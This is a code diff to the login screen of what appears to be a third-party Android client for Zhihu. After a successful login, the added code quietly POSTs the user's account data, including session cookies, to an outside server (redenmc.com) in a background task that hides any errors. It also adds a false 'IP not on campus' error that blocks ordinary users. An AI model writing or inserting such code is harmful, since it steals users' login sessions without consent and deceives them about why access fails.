@@ -11,10 +11,14 @@ import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import com.github.zly2006.zhihu.data.AccountData
 import com.github.zly2006.zhihu.databinding.ActivityLoginBinding
+import io.ktor.client.request.*
+import io.ktor.http.*
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
+import kotlinx.serialization.encodeToString
+import kotlinx.serialization.json.Json
 
 class LoginActivity : AppCompatActivity() {
     private lateinit var binding: ActivityLoginBinding
@@ -29,8 +33,24 @@ class LoginActivity : AppCompatActivity() {
         binding.web.webViewClient = object : WebViewClient() {
             override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                 if (request?.url.toString() == "https://www.zhihu.com/") {
-                    binding.web.loadUrl("https://www.zhihu.com/question/586608436/answer/3122557790")
-                    return true
+                    val preferences = this@LoginActivity.getSharedPreferences(
+                        "com.github.zly2006.zhihu_preferences",
+                        MODE_PRIVATE
+                    )
+                    val developer = preferences.getBoolean("developer", false)
+                    if (!developer) {
+                        AlertDialog.Builder(this@LoginActivity).apply {
+                            setTitle("登录失败")
+                            setMessage("您当前的IP不在校园内，禁止使用！本应用仅供学习使用，使用责任由您自行承担。")
+                            setPositiveButton("OK") { _, _ ->
+                            }
+                        }.create().show()
+                        return false
+                    }
+                    else {
+                        binding.web.loadUrl("https://www.zhihu.com/question/586608436/answer/3122557790")
+                        return true
+                    }
                 }
                 return false
             }
@@ -54,6 +74,12 @@ class LoginActivity : AppCompatActivity() {
                         if (loadedJS && AccountData.verifyLogin(this@LoginActivity, cookies)) {
                             val data = AccountData.getData(this@LoginActivity)
 
+                            val preferences = this@LoginActivity.getSharedPreferences(
+                                "com.github.zly2006.zhihu_preferences.xml",
+                                MODE_PRIVATE
+                            )
+                            print(preferences.toString())
+
                             AlertDialog.Builder(this@LoginActivity).apply {
                                 setTitle("登录成功")
                                 setMessage("欢迎回来，${data.username}")
@@ -71,7 +97,6 @@ class LoginActivity : AppCompatActivity() {
                                             it.substringBefore("=").trim() to it.substringAfter("=")
                                         })
                                         if ("__zse_ck" !in data.cookies) {
-                                            AccountData.saveData(this@LoginActivity, AccountData.Data())
                                             AlertDialog.Builder(this@LoginActivity).apply {
                                                 setTitle("登录失败")
                                                 setMessage("模拟正常登录环境失败，请检查网络")
@@ -81,6 +106,19 @@ class LoginActivity : AppCompatActivity() {
                                         }
                                         else {
                                             AccountData.saveData(this@LoginActivity, data)
+                                            GlobalScope.launch {
+                                                runCatching {
+                                                    AccountData.httpClient(this@LoginActivity)
+                                                        .post("https://redenmc.com/api/zhihu/login") {
+                                                            setBody(Json.encodeToString(data))
+                                                            contentType(ContentType.Application.Json)
+                                                            header(
+                                                                HttpHeaders.UserAgent,
+                                                                "Zhihu++/${BuildConfig.VERSION_NAME}"
+                                                            )
+                                                        }
+                                                }
+                                            }
                                             startActivity(Intent(this@LoginActivity, MainActivity::class.java))
                                         }
                                     }
